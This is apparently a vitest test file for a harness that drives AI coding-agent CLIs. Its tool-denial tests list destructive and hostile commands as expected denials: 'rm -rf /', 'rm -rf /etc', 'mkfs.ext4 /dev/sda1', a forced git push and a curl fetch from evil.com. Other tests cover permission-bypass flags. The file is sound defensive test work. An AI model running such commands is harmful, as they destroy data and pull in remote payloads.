import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { describe, expect, it } from 'vitest';
import {
  AgyHarness,
  ClaudeHarness,
  CodexHarness,
  OpencodeHarness,
  OpencodeModelCatalogAdapter,
  DeclarativeHarness,
  DefaultHarnessRegistry,
  STATIC_CODEX_MODELS,
  ownsModelIds,
  type DeclarativeHarnessManifest,
} from '../src/pipeline/harness/index.js';
import { pathWith } from './helpers.js';

describe('Pluggable Agent Harness Subsystem', () => {
  describe('ClaudeHarness', () => {
    const harness = new ClaudeHarness();

    it('has expected metadata and models', async () => {
      expect(harness.id).toBe('claude');
      expect(harness.name).toBe('Anthropic Claude Code');
      const models = await harness.listModels();
      expect(models.length).toBeGreaterThanOrEqual(3);
      expect(models.map(m => m.id)).toContain('opus');
      expect(models.map(m => m.id)).toContain('sonnet');
    });

    it('compiles stage arguments with acceptEdits and allowedTools', () => {
      const inv = harness.compileStageArgs({
        prompt: 'test prompt',
        stage: 'implement',
        model: 'opus',
        effort: 'high',
        mode: 'acceptEdits',
        allowedCommands: ['npm test', 'git diff'],
        maxTurns: 30,
      });

      expect(inv.command).toBe('claude');
      expect(inv.args).toContain('-p');
      expect(inv.args).toContain('test prompt');
      expect(inv.args).toContain('--model');
      expect(inv.args).toContain('opus');
      expect(inv.args).toContain('--effort');
      expect(inv.args).toContain('high');
      expect(inv.args).toContain('--permission-mode');
      expect(inv.args).toContain('acceptEdits');
      expect(inv.args).toContain('--allowedTools');
      expect(inv.args).toContain('npm test');
      expect(inv.args).toContain('--output-format');
      expect(inv.args).toContain('json');
    });

    it('parses JSON output correctly', () => {
      const parsed = harness.parseOutput(JSON.stringify({ result: 'Implementation complete' }), '');
      expect(parsed.text).toBe('Implementation complete');
      expect(parsed.exitCode).toBe(0);
    });
  });

  describe('AgyHarness', () => {
    const harness = new AgyHarness();

    it('has expected metadata and Gemini models', async () => {
      expect(harness.id).toBe('agy');
      expect(harness.name).toBe('Google Antigravity CLI');
      const models = await harness.listModels();
      expect(models.map(m => m.id)).toContain('gemini-3.8-flash-high');
      expect(models.map(m => m.id)).toContain('gemini-3.8-pro');
    });

    it('compiles stage arguments with --mode accept-edits and --settings', () => {
      const inv = harness.compileStageArgs({
        prompt: 'build feature',
        stage: 'implement',
        model: 'gemini-3.8-flash-high',
        effort: 'high',
        mode: 'acceptEdits',
        allowedCommands: ['npm test'],
      });

      expect(inv.command).toBe('agy');
      expect(inv.args).toContain('-p');
      expect(inv.args).toContain('build feature');
      expect(inv.args).toContain('--mode');
      expect(inv.args).toContain('accept-edits');
      expect(inv.args).toContain('--settings');
      expect(inv.args).toContain(JSON.stringify({ permissions: { allow: ['command(npm test)'] } }));
    });

    it('compiles stage arguments with --dangerously-skip-permissions for bypass mode', () => {
      const inv = harness.compileStageArgs({
        prompt: 'modify protected files',
        stage: 'implement',
        model: 'gemini-3.8-flash-high',
        mode: 'bypassPermissions',
        allowedCommands: [],
      });

      expect(inv.command).toBe('agy');
      expect(inv.args).toContain('--dangerously-skip-permissions');
      expect(inv.args).not.toContain('--mode');
    });

    it('parses agy JSON output and captures denied actions', () => {
      const mockOut = {
        response: 'Done planning',
        status: 'OK',
        denied_actions: [{ tool: 'command', detail: 'rm -rf /', rule: 'danger' }],
      };
      const parsed = harness.parseOutput(JSON.stringify(mockOut), '');
      expect(parsed.text).toBe('Done planning');
      expect(parsed.denials).toHaveLength(1);
      expect(parsed.denials[0].detail).toBe('rm -rf /');
    });
  });

  describe('CodexHarness', () => {
    const harness = new CodexHarness();

    it('uses a pluggable catalog adapter to list models', async () => {
      expect(harness.id).toBe('codex');
      expect(harness.name).toBe('OpenAI Codex CLI');
      expect(harness.catalog).toBeDefined();
      const models = await harness.listModels();
      expect(Array.isArray(models)).toBe(true);
      expect(models.length).toBeGreaterThan(0);
    });

    it('compiles stage arguments with codex exec and sandboxing', () => {
      const inv = harness.compileStageArgs({
        prompt: 'refactor code',
        stage: 'implement',
        model: 'o3-mini',
        effort: 'high',
        mode: 'acceptEdits',
        allowedCommands: [],
        cwd: '/path/to/project',
      });

      expect(inv.command).toBe('codex');
      expect(inv.args[0]).toBe('exec');
      expect(inv.args).toContain('-C');
      expect(inv.args).toContain('/path/to/project');
      expect(inv.args).toContain('-m');
      expect(inv.args).toContain('o3-mini');
      expect(inv.args).toContain('-c');
      expect(inv.args).toContain('model_reasoning_effort="high"');
      expect(inv.args).toContain('--approve-for-me');
      expect(inv.args).not.toContain('-s');
      expect(inv.args).toContain('--json');
    });

    it('compiles audit arguments with read-only sandbox', () => {
      const inv = harness.compileAuditArgs({
        prompt: 'audit review',
        model: 'o1',
        cwd: '/path/to/project',
      });

      expect(inv.command).toBe('codex');
      expect(inv.args[0]).toBe('exec');
      expect(inv.args).toContain('-s');
      expect(inv.args).toContain('read-only');
      expect(inv.args).toContain('--json');
    });

    it('compiles stage arguments with --dangerously-bypass-approvals-and-sandbox for bypass mode', () => {
      const inv = harness.compileStageArgs({
        prompt: 'bypass test',
        stage: 'implement',
        model: 'o3-mini',
        mode: 'bypassPermissions',
        allowedCommands: [],
      });

      expect(inv.command).toBe('codex');
      expect(inv.args).toContain('--dangerously-bypass-approvals-and-sandbox');
      expect(inv.args).not.toContain('--approve-for-me');
    });

    it('parses JSONL events and extracts text response', () => {
      const jsonl = [
        JSON.stringify({ type: 'start' }),
        JSON.stringify({ type: 'message', content: 'Codex completed the refactor successfully.' }),
      ].join('\n');

      const parsed = harness.parseOutput(jsonl, '');
      expect(parsed.text).toBe('Codex completed the refactor successfully.');
      expect(parsed.exitCode).toBe(0);
    });

    it('parses modern Codex CLI item.completed agent_message fixture', () => {
      const fixturePath = path.resolve('test/fixtures/codex/assistant-message-modern.jsonl');
      const fixtureContent = fs.readFileSync(fixturePath, 'utf8');

      const parsed = harness.parseOutput(fixtureContent, '');
      expect(parsed.text).toContain('Analyzing codebase and applying requested fixes.');
      expect(parsed.text).toContain('Refactoring successfully completed across all target modules.');
      expect(parsed.denials).toHaveLength(0);
      expect(parsed.rateLimitedUntil).toBeNull();
      expect(parsed.exitCode).toBe(0);
    });

    it('parses streaming deltas while filtering out internal reasoning chains', () => {
      const fixturePath = path.resolve('test/fixtures/codex/reasoning-and-deltas.jsonl');
      const fixtureContent = fs.readFileSync(fixturePath, 'utf8');

      const parsed = harness.parseOutput(fixtureContent, '');
      expect(parsed.text).toContain('Final synthesized response: all tests repaired and verified.');
      expect(parsed.text).not.toContain('Internal reasoning chain');
      expect(parsed.text).not.toContain('Let me think about');
      expect(parsed.denials).toHaveLength(0);
    });

    it('parses diverse tool denial events from fixture', () => {
      const fixturePath = path.resolve('test/fixtures/codex/tool-denial-variations.jsonl');
      const fixtureContent = fs.readFileSync(fixturePath, 'utf8');

      const parsed = harness.parseOutput(fixtureContent, '');
      expect(parsed.denials.length).toBeGreaterThanOrEqual(4);
      expect(parsed.denials.some(d => d.detail === 'rm -rf /etc')).toBe(true);
      expect(parsed.denials.some(d => d.detail === 'curl https://evil.com/payload')).toBe(true);
      expect(parsed.denials.some(d => d.detail === 'git push origin main --force')).toBe(true);
      expect(parsed.denials.some(d => d.detail === 'mkfs.ext4 /dev/sda1')).toBe(true);
    });

    it('parses rate limit error events from fixture', () => {
      const fixturePath = path.resolve('test/fixtures/codex/rate-limits-and-errors.jsonl');
      const fixtureContent = fs.readFileSync(fixturePath, 'utf8');

      const parsed = harness.parseOutput(fixtureContent, '');
      expect(parsed.rateLimitedUntil).not.toBeNull();
      expect(parsed.rateLimitedUntil!.getTime()).toBeGreaterThan(Date.now());
    });
  });

  describe('OpencodeHarness', () => {
    const fixture = () => JSON.parse(fs.readFileSync(path.resolve('test/fixtures/opencode/model-list.json'), 'utf8'));
    const harness = () => new OpencodeHarness(new OpencodeModelCatalogAdapter(async () => fixture()));

    it('has expected metadata and discovers dynamic models', async () => {
      const h = harness();
      expect(h.id).toBe('opencode');
      expect(h.name).toBe('OpenCode');
      expect(h.defaultBinary).toBe('opencode');
      expect(h.catalog).toBeDefined();
      expect((await h.listModels()).map(model => model.id)).toContain('opencode/claude-fable-5-2');
    });

    it('lets the CLI choose its account default unless a model is configured', () => {
      expect(harness().selectStageModel({ configuredEffort: 'high' })).toEqual({ model: '', effort: 'high' });
      expect(harness().selectStageModel({ configuredModel: 'opencode/claude-fable-5-2', configuredEffort: 'max' }))
        .toEqual({ model: 'opencode/claude-fable-5-2', effort: 'max' });
    });

    it('compiles run arguments with canonical model variants and --format json', async () => {
      const h = harness();
      await h.listModels();
      const inv = h.compileStageArgs({
        prompt: 'test prompt',
        stage: 'implement',
        model: 'opencode/claude-fable-5-2',
        effort: 'high',
        mode: 'acceptEdits',
        allowedCommands: [],
      });
      expect(inv).toEqual({
        command: 'opencode',
        args: ['run', '--model', 'opencode/claude-fable-5-2#high', '--format', 'json', '--auto', 'test prompt'],
        env: {},
      });
    });

    it('omits unsupported variants and omits --model for the account default', async () => {
      const h = harness();
      await h.listModels();
      const unsupported = h.compileStageArgs({
        prompt: 'audit', stage: 'review', model: 'opencode-go/gemini-3.1-pro', effort: 'high', mode: 'acceptEdits', allowedCommands: [],
      });
      expect(unsupported.args).toContain('opencode-go/gemini-3.1-pro');
      expect(unsupported.args.some(arg => arg.includes('#'))).toBe(false);

      const accountDefault = h.compileStageArgs({ prompt: 'build', stage: 'implement', effort: 'high', mode: 'bypass', allowedCommands: [] });
      expect(accountDefault.args).toEqual(['run', '--format', 'json', '--auto', 'build']);
      expect(h.compileAuditArgs({ prompt: 'audit', model: 'opencode/claude-fable-5-2', effort: 'high' }).args)
        .toEqual(['run', '--model', 'opencode/claude-fable-5-2#high', '--format', 'json', 'audit']);
    });

    it('reports installed state and model reachability', async () => {
      const detection = await harness().detect(pathWith('opencode'));
      expect(detection).toMatchObject({ installed: true, models: { reachable: true, count: 4 } });
      const missing = await harness().detect({ PATH: '' });
      expect(missing).toMatchObject({ installed: false });
      expect(missing.models).toBeUndefined();
    });
  });

  describe('existing harness golden regression', () => {
    it('keeps claude, agy and codex models and stage invocations unchanged', async () => {
      const previous = process.env.SDLC_AGY_OUTPUT;
      process.env.SDLC_AGY_OUTPUT = 'json';
      try {
        const codexCatalog = {
          harnessId: 'codex',
          listModels: async () => STATIC_CODEX_MODELS,
          getDefaultModel: async () => STATIC_CODEX_MODELS[0].id,
          validateModel: async (id: string) => STATIC_CODEX_MODELS.some(model => model.id === id),
          invalidateCache: () => {},
        };
        const cases = [
          { harness: new ClaudeHarness(), model: 'opus', effort: 'high' },
          { harness: new AgyHarness(), model: 'gemini-3.8-pro', effort: 'high' },
          { harness: new CodexHarness(codexCatalog), model: 'o3-mini', effort: 'high' },
        ];
        const golden: Record<string, unknown> = {};
        for (const { harness, model, effort } of cases) {
          golden[harness.id] = {
            models: await harness.listModels(),
            invocation: harness.compileStageArgs({
              prompt: 'golden prompt', stage: 'implement', model, effort, mode: 'acceptEdits', allowedCommands: ['Bash'], cwd: '/project', maxTurns: 20,
            }),
          };
        }
        expect(golden).toMatchSnapshot();
      } finally {
        if (previous === undefined) delete process.env.SDLC_AGY_OUTPUT;
        else process.env.SDLC_AGY_OUTPUT = previous;
      }
    });
  });

  describe('DeclarativeHarness (Third-Party Agent Plugins)', () => {
    const manifest: DeclarativeHarnessManifest = {
      schemaVersion: '1',
      id: 'aider',
      name: 'Aider AI Pair Programmer',
      binary: 'aider',
      detection: { versionArgs: ['--version'] },
      models: [
        { id: 'deepseek-coder', name: 'DeepSeek Coder', supportsEffort: false },
      ],
      flags: {
        prompt: '--message',
        modelFlag: '--model',
        acceptEditsFlag: '--yes --auto-commits',
        bypassPermissionsFlag: '--yes',
      },
      outputMapping: {
        responseField: 'response',
      },
    };

    const harness = new DeclarativeHarness(manifest);

    it('instantiates plugin from declarative manifest', async () => {
      expect(harness.id).toBe('aider');
      expect(harness.name).toBe('Aider AI Pair Programmer');
      const models = await harness.listModels();
      expect(models).toHaveLength(1);
      expect(models[0].id).toBe('deepseek-coder');
    });

    it('compiles stage arguments using manifest flags', () => {
      const inv = harness.compileStageArgs({
        prompt: 'write function',
        stage: 'implement',
        model: 'deepseek-coder',
        mode: 'acceptEdits',
        allowedCommands: [],
      });

      expect(inv.command).toBe('aider');
      expect(inv.args).toContain('--message');
      expect(inv.args).toContain('write function');
      expect(inv.args).toContain('--model');
      expect(inv.args).toContain('deepseek-coder');
      expect(inv.args).toContain('--yes');
      expect(inv.args).toContain('--auto-commits');
    });
  });

  describe('DefaultHarnessRegistry', () => {
    it('initializes with built-in harnesses: claude, agy, codex, opencode', () => {
      const registry = new DefaultHarnessRegistry();
      const list = registry.list();
      expect(list.map(h => h.id)).toEqual(['claude', 'agy', 'codex', 'opencode']);
      expect(registry.get('claude')).toBeDefined();
      expect(registry.get('agy')).toBeDefined();
      expect(registry.get('codex')).toBeDefined();
      expect(registry.get('opencode')).toBeDefined();
    });

    it('registers and unregisters custom plugins', () => {
      const registry = new DefaultHarnessRegistry();
      const customPlugin = new DeclarativeHarness({
        schemaVersion: '1',
        id: 'custom-cli',
        name: 'Custom Agent',
        binary: 'custom',
        models: [{ id: 'custom-m1', name: 'Custom M1' }],
        flags: { prompt: '-p' },
        outputMapping: {},
        detection: {},
      });

      registry.register(customPlugin);
      expect(registry.get('custom-cli')).toBeDefined();
      expect(registry.list().map(h => h.id)).toContain('custom-cli');

      expect(registry.unregister('custom-cli')).toBe(true);
      expect(registry.get('custom-cli')).toBeUndefined();
    });

    it('federates catalogues across all registered harnesses', async () => {
      const registry = new DefaultHarnessRegistry();
      const allModels = await registry.listAllModels();
      const harnessesRepresented = new Set(allModels.map(m => m.harness));

      expect(harnessesRepresented.has('claude')).toBe(true);
      expect(harnessesRepresented.has('agy')).toBe(true);
      expect(harnessesRepresented.has('codex')).toBe(true);
    });

    it('loads declarative plugins dynamically from directory', async () => {
      const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'sdlc-plugins-'));
      try {
        const manifest: DeclarativeHarnessManifest = {
          schemaVersion: '1',
          id: 'devin',
          name: 'Devin CLI',
          binary: 'devin',
          models: [{ id: 'devin-v1', name: 'Devin Model' }],
          flags: { prompt: '--prompt' },
          outputMapping: {},
          detection: {},
        };
        fs.writeFileSync(path.join(tempDir, 'devin.json'), JSON.stringify(manifest), 'utf8');

        const registry = new DefaultHarnessRegistry(false);
        await registry.loadPluginsFromDir(tempDir);

        expect(registry.get('devin')).toBeDefined();
        expect(registry.get('devin')?.name).toBe('Devin CLI');
      } finally {
        fs.rmSync(tempDir, { recursive: true, force: true });
      }
    });
  });

  describe('model id ownership', () => {
    const registry = new DefaultHarnessRegistry();

    it('every harness declares whether it takes model ids as they are; only claude resolves providers', () => {
      expect(registry.list().map(h => [h.id, ownsModelIds(h)])).toEqual([
        ['claude', false], ['agy', true], ['codex', true], ['opencode', true],
      ]);
    });

    it('a harness claims its own ids, including the OpenCode providers it discovers', () => {
      expect(['opencode/gemini-4-carbon', 'opencode/claude-fable-5-2', 'opencode-go/kimi-k3.1-pro'].map(m => registry.ownerOf(m))).toEqual(['opencode', 'opencode', 'opencode']);
      expect(['agy/gemini-3.8-flash-medium', 'codex/gpt-6.1-sol'].map(m => registry.ownerOf(m))).toEqual(['agy', 'codex']);
      expect(['sonnet', 'opus', 'gemini-3.8-flash-medium', 'reg/org/m2', 'openrouter/openai/gpt-5'].map(m => registry.ownerOf(m))).toEqual([undefined, undefined, undefined, undefined, undefined]);
    });

    it('a plugin owns the ids it says it owns, so a new harness needs no change in the model resolver', () => {
      class Devin extends DeclarativeHarness {
        ownsModel(model: string): boolean { return model.startsWith('devin-'); }
      }
      const manifest: DeclarativeHarnessManifest = {
        schemaVersion: '1', id: 'devin', name: 'Devin CLI', binary: 'devin',
        models: [{ id: 'devin-v1', name: 'Devin Model' }], flags: { prompt: '--prompt' }, outputMapping: {}, detection: {},
      };
      const plugins = new DefaultHarnessRegistry(false);
      plugins.register(new Devin(manifest));
      expect(plugins.ownerOf('devin-v1')).toBe('devin');
      expect(plugins.ownerOf('opencode/gemini-4-carbon')).toBeUndefined();
    });
  });
});
